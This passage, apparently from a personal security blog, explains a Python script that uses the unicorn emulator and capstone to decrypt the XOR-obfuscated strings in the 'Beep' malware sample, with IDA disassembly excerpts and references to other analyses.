<p>You might also be wondering why do we check the address with offset 0xbcc since it corresponds to a completely other string? This is simply done for our emulator to know that it completed the last decryption loop shown in the picture.</p>
<h4 id="main-loop">Main loop<a hidden class="anchor" aria-hidden="true" href="#main-loop">#</a></h4>
<p>And here comes the main loop of our <code>hook_code</code> function. In this loop we check what instruction is the current one, what is the mnemonic and address but also patch some register calls:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> md<span style="color:#f92672">.</span>disasm(uc<span style="color:#f92672">.</span>mem_read(address, size), address):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>mnemonic <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;cmp&#39;</span>:
</span></span><span style="display:flex;"><span>        ops <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span>op_str<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;, &#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ops[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;ecx&#39;</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            Usually in the decryption, there is a loop and we need to check whether the cmp in the loop is with a hardcoded value or with a register. Based on static analysis, there was either a check with a numeric value or with edi register. That is why we check for edi or else we eval() the number from str type to int.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            Also, in ecx there was the counter of the loop stored. That&#39;s why we read it. We could also just keep a counter here.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>            ecx <span style="color:#f92672">=</span> uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_ECX)
</span></span><span style="display:flex;"><span>            val <span style="color:#f92672">=</span> ops[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> val <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;edi&#39;</span>:
</span></span><span style="display:flex;"><span>                val <span style="color:#f92672">=</span> uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EDI)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                val <span style="color:#f92672">=</span> eval(val)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ecx <span style="color:#f92672">==</span> val:
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># If the loop is complete, proceed to read the decrypted value.</span>
</span></span><span style="display:flex;"><span>                dec <span style="color:#f92672">=</span> uc<span style="color:#f92672">.</span>mem_read(uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EBP)<span style="color:#f92672">-</span>curr_offset, val)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">in</span> dec:
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e"># If it has null bytes inside, its utf-16 so we need to read double the size before decoding from utf-16</span>
</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>hex(address)<span style="color:#e6db74">}</span><span style="color:#e6db74"> :: </span><span style="color:#e6db74">{</span>uc<span style="color:#f92672">.</span>mem_read(uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EBP)<span style="color:#f92672">-</span>curr_offset, val<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-16&#34;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>hex(address)<span style="color:#e6db74">}</span><span style="color:#e6db74"> :: </span><span style="color:#e6db74">{</span>dec<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>mnemonic <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;mov&#39;</span>:
</span></span><span style="display:flex;"><span>        ops <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span>op_str<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;, &#39;</span>)  <span style="color:#75715e"># get source and destination operands</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;ptr [ebp +&#39;</span> <span style="color:#f92672">in</span> ops[<span style="color:#ae81ff">0</span>]:  <span style="color:#75715e"># i want ebp+ecx to be the destination operand</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># from commands like byte ptr [ebp + ecx - 0x1f0], al get only the 0x1f0 part</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># We need the offset to later find the address of where the decrypted string is stored</span>
</span></span><span style="display:flex;"><span>            curr_offset <span style="color:#f92672">=</span> eval(i<span style="color:#f92672">.</span>op_str<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; - &#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;], &#39;</span>)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>mnemonic <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;call&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># skip indirect calls</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># for example call eax would make an indirect call to a function or some dll. We want to avoid that as it leads to errors</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>op_str <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;eax&#39;</span>, <span style="color:#e6db74">&#39;ebx&#39;</span>, <span style="color:#e6db74">&#39;esi&#39;</span>]:
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># move eip by 2 bytes</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># call [register] is 2 bytes in total so thats why we modify EIP by 2</span>
</span></span><span style="display:flex;"><span>            uc<span style="color:#f92672">.</span>reg_write(UC_X86_REG_EIP, uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EIP)<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)
</span></span></code></pre></div><p>The way the loop is happening is kinda like a template: <code>for i in md.disasm(uc.mem_read(address, size), address)</code>.
Basically, with the use of <code>unicorn</code> (<code>uc</code> instance) we start to read a number of bytes (based on the size parameter) from the address passed to the <code>mem_read</code>. Then, with the use of <code>capstone</code> (<code>md</code> instance) we are able to parse out these bytes as assembly instructions and seperate them further into mnemonic, opcode, address etc.</p>
<p>We can further break down the main loop into 3 subcategories:</p>
<ul>
<li><code>cmp</code> instruction.</li>
<li><code>mov</code> instruction.</li>
<li><code>call</code> instruction.</li>
</ul>
<h5 id="main-loop---cmp--mov-instructions">Main loop - cmp &amp; mov instructions<a hidden class="anchor" aria-hidden="true" href="#main-loop---cmp--mov-instructions">#</a></h5>
<p>The <code>cmp</code> instruction check is the most important one as this is the one that is used for locating the decrypted strings. What we noticed through IDA&rsquo;s pseudocode is the following pattern on decryption:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep33.png" alt=""  />
</p>
<p>So the pattern for each loop is that it transfers each decrypted byte to the <code>al</code> register and uses the <code>ecx</code> register for pointing to the next location where the next decrypted byte will be stored. Let&rsquo;s take the first 3 assembly lines:</p>
<pre tabindex="0"><code>.text:100013C2                 mov     al, byte ptr [ebp+ecx+var_34]
.text:100013C6                 xor     al, 0E8h
.text:100013C8                 mov     [ebp+ecx+var_230], al
</code></pre><p>The <code>[ebp+ecx+var_34]</code> contains the encrypted string array, while the <code>[ebp+ecx+var_230]</code> contains the decrypted values. You can easily tell by the fact that first we get a byte from <code>[ebp+ecx+var_34]</code>, then xor it with a value and then store it to another array.</p>
<p>The relevant part for the string decryption is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>mnemonic <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;cmp&#39;</span>:
</span></span><span style="display:flex;"><span>    ops <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span>op_str<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;, &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ops[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;ecx&#39;</span>:
</span></span><span style="display:flex;"><span>        ecx <span style="color:#f92672">=</span> uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_ECX)
</span></span><span style="display:flex;"><span>        val <span style="color:#f92672">=</span> ops[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> val <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;edi&#39;</span>:
</span></span><span style="display:flex;"><span>            val <span style="color:#f92672">=</span> uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EDI)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            val <span style="color:#f92672">=</span> eval(val)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ecx <span style="color:#f92672">==</span> val:
</span></span><span style="display:flex;"><span>            dec <span style="color:#f92672">=</span> uc<span style="color:#f92672">.</span>mem_read(uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EBP)<span style="color:#f92672">-</span>curr_offset, val)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">in</span> dec:
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>hex(address)<span style="color:#e6db74">}</span><span style="color:#e6db74"> :: </span><span style="color:#e6db74">{</span>uc<span style="color:#f92672">.</span>mem_read(uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EBP)<span style="color:#f92672">-</span>curr_offset, val<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-16&#34;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>hex(address)<span style="color:#e6db74">}</span><span style="color:#e6db74"> :: </span><span style="color:#e6db74">{</span>dec<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span></code></pre></div><p>So first, we check if the mnemonic is a <code>cmp</code> instruction (<code>cmp     ecx, 0Fh</code>).<br>
If so, we split the operation string <code>ecx, 0Fh</code> by the comma symbol and check if <code>ecx</code> is the first part. If this is true, this means we have stumbled upon a decryption loop as these were using <code>ecx</code> for the enc/dec arrays.</p>
<p>Then, we read the <code>ecx</code> value - which is the program counter of the loop - and we also store the second part of the operation string (0x0F in our example) as this is the termination value for the loop. There were cases where the second part was not a hex value but rather it was reading a value from the <code>edi</code> register. If this is the case, we read the value from <code>edi</code> register, else we get the hex value.</p>
<p>Then we proceed to compare these two to check if the loop has been completed. If that&rsquo;s the case, then we have a fully decrypted string and we proceed to read it. How we do that is by getting the current offset (<code>curr_offset</code>) and subtracting <code>EBP</code> with that. But what is the <code>curr_offset</code> and how do we calculate it?</p>
<p>Well, the <code>curr_offset</code> is basically the var_230 from the previous example <code>[ebp+ecx+var_230], al</code>. It is the offset in memory to where the program starts storing the decrypted bytes, and with the help of <code>ecx</code> (which gets increased in each loop) we move to the next index of the array.<br>
So to read the decrypted string from the start, we must subtract whatever value the var_230 has in order to go back to the start of the array.</p>
<p>The relevant code for calculating the curr_offset is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>mnemonic <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;mov&#39;</span>:
</span></span><span style="display:flex;"><span>    ops <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span>op_str<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;, &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;ptr [ebp +&#39;</span> <span style="color:#f92672">in</span> ops[<span style="color:#ae81ff">0</span>]:
</span></span><span style="display:flex;"><span>        curr_offset <span style="color:#f92672">=</span> eval(i<span style="color:#f92672">.</span>op_str<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; - &#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;], &#39;</span>)[<span style="color:#ae81ff">0</span>])
</span></span></code></pre></div><p>So if the mnemonic is a <code>mov</code>, we split again by the comma symbol and check if the first part contains the string <code>&quot;ptr [ebp + &quot;</code>. Why? Recall to the previous example:</p>
<pre tabindex="0"><code>.text:100013C2                 mov     al, byte ptr [ebp+ecx+var_34]
.text:100013C6                 xor     al, 0E8h
.text:100013C8                 mov     [ebp+ecx+var_230], al
</code></pre><p>If we were to print each instruction, we would see that the <code>mov     [ebp+ecx+var_230], al</code> was actually being emulated as <code>mov   byte ptr [ebp + ecx - some_offset], al</code>.  This is why we split by comma, check if this is the case, and then do further actions to get the curr_offset value in order to know where to read from in memory after the decryption.</p>
<p>Now for the decryption part, if the decrypted string is <code>utf-16</code> encoded, we need to read double the length of the string since the decrypted string contains null bytes between each decrypted byte (so double the length).</p>
<h5 id="main-loop---call-instruction">Main loop - call instruction<a hidden class="anchor" aria-hidden="true" href="#main-loop---call-instruction">#</a></h5>
<p>Recall <a href="https://connar.github.io/posts/beepmalware/#offset-0xa3e">previously</a> that we said we want to skip indirect calls to registers such as <code>eax</code> for example. This is why calling a register might do a call to a loaded dll that unicorn cannot emulate, leading to errors. Since these calls are not useful to emulating the decryption of strings, we want to avoid them by patching <code>EIP</code>.<br>
The relevant code is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>mnemonic <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;call&#39;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>op_str <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;eax&#39;</span>, <span style="color:#e6db74">&#39;ebx&#39;</span>, <span style="color:#e6db74">&#39;esi&#39;</span>]:
</span></span><span style="display:flex;"><span>        uc<span style="color:#f92672">.</span>reg_write(UC_X86_REG_EIP, uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EIP)<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)
</span></span></code></pre></div><p>An example of why we skip 2 bytes can be given with the help of IDA:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep34.png" alt=""  />
</p>
<h4 id="running-our-code">Running our code<a hidden class="anchor" aria-hidden="true" href="#running-our-code">#</a></h4>
<p>After the breakdown of the code, I think we are now ready to run our emulation script and see what we get. The results are the following:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep35.png" alt=""  />
</p>
<p>The mystery continues deeper, by downloading data and storing them in a dll named <code>AphroniaHaimavati.dll</code>. Based on <a href="https://www.bleepingcomputer.com/news/security/new-stealthy-beep-malware-focuses-heavily-on-evading-detection/">an article</a> analyzing it further, <code>AphroniaHaimavati.dll</code> contains data related to more anti-debug checks. This dll will not be analyzed as the goal of this post was to showcase how to emulate the decryption of strings in malware samples and hopefully learn a new skill like i did (thanks again r4sti!).<br>
There are though articles discussing further the <code>AphroniaHaimavati.dll</code> that I will be leaving in the <em>References</em> part for anyone interested:)</p>
<p><strong>References</strong></p>
<blockquote>
    <ul>
        <li> [1] <a href="https://www.bleepingcomputer.com/news/security/new-stealthy-beep-malware-focuses-heavily-on-evading-detection/">Bill Toulas: New stealthy 'Beep' malware focuses heavily on evading detection</i></a></li>
        <li> [2] <a href="https://www.swascan.com/beep-analisi-malware/">swascan: <i>Beep Malware: static and dynamic analysis</i></a></li>
        <li> [3] <a href="https://research.openanalysis.net/pikabot/yara/config/loader/2023/02/26/pikabot.html">OALABS: <i>PikaBot</i></a></li>
        <li> [4] <a href="https://gridinsoft.com/blogs/beep-malware-detection-evasion/">Gridinsoft.blog: <i>New stealthy “Beep” malware focuses heavily on evading detection</i></a></li>
        <li> [4] <a href="https://unit42.paloaltonetworks.com/unit42-pythons-and-unicorns-and-hancitoroh-my-decoding-binaries-through-emulation/">Unit42: <i>Pythons and Unicorns and Hancitor…Oh My! Decoding Binaries Through Emulation</i></a></li>
</i></a></li>
    </ul>
</blockquote>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/beep-malware/">Beep-Malware</a></li>
      <li><a href="http://localhost:1313/tags/pikabot/">PikaBot</a></li>
    </ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://localhost:1313/">Journal of Connar</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
